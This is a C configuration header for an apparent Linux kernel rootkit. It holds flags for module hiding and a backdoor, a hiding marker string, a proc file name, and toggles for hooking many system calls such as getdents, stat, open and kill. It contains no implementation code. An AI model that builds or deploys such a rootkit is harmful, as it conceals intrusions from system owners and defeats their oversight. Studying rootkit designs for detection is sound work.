#ifndef _CONFIG_H
#define _CONFIG_H

#define HIDE_MODULE      0
#define BACKDOOR         0

#define HIDE_STR "HiddenKlecko"
#define PROC_FILENAME    "rootkit_proc"

#define HOOK_GETDENTS    1
#define HOOK_GETDENTS64  1
#define HOOK_STAT        1
#define HOOK_LSTAT       1
#define HOOK_CHDIR       1
#define HOOK_GETPRIORITY 1
#define HOOK_OPEN        1
#define HOOK_OPENAT      1
#define HOOK_GETPGID     1
#define HOOK_GETSID      1
#define HOOK_SCHED_GETAFFINITY     1
#define HOOK_SCHED_GETPARAM        1
#define HOOK_SCHED_GETSCHEDULER    1
#define HOOK_SCHED_RR_GET_INTERVAL 1
#define HOOK_KILL        1

#endif
